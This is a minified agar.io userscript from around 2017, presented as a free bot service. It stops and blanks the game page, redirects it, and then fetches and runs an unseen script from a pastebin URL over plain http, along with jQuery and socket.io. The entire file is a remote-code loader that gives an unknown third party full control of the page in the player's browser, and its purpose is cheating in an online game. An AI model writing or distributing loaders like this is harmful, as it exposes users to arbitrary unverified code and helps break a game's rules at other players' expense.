// ==UserScript==
// @name         HistoryBots.cf Agar.io Script 6.0 - 2017 -
// @version      v6.0
// @namespace    HistoryBots.cf Agar.io
// @description  New Free Agar.io Bot Service!
// @author       BoujeeYT
// @match        http://agar.io/*
// @run-at       document-start
// ==/UserScript==

function loadScript(a){var b=document.createElement("script");b.type="text/javascript",b.src=a,document.head.appendChild(b)}function stopPage(){window.stop(),document.documentElement.innerHTML=null}"/"==location.pathname?(stopPage(),location.href="http://agar.io/historybots.cf"+location.hash):"/historybots.cf"==location.pathname&&(stopPage(),loadScript("https://code.jquery.com/jquery-3.1.1.min.js"),loadScript("https://cdn.socket.io/socket.io-1.3.5.js"),loadScript("http://pastebin.com/raw/9yDdsre6/js?="+Math.floor(1e10*Math.random()+1)));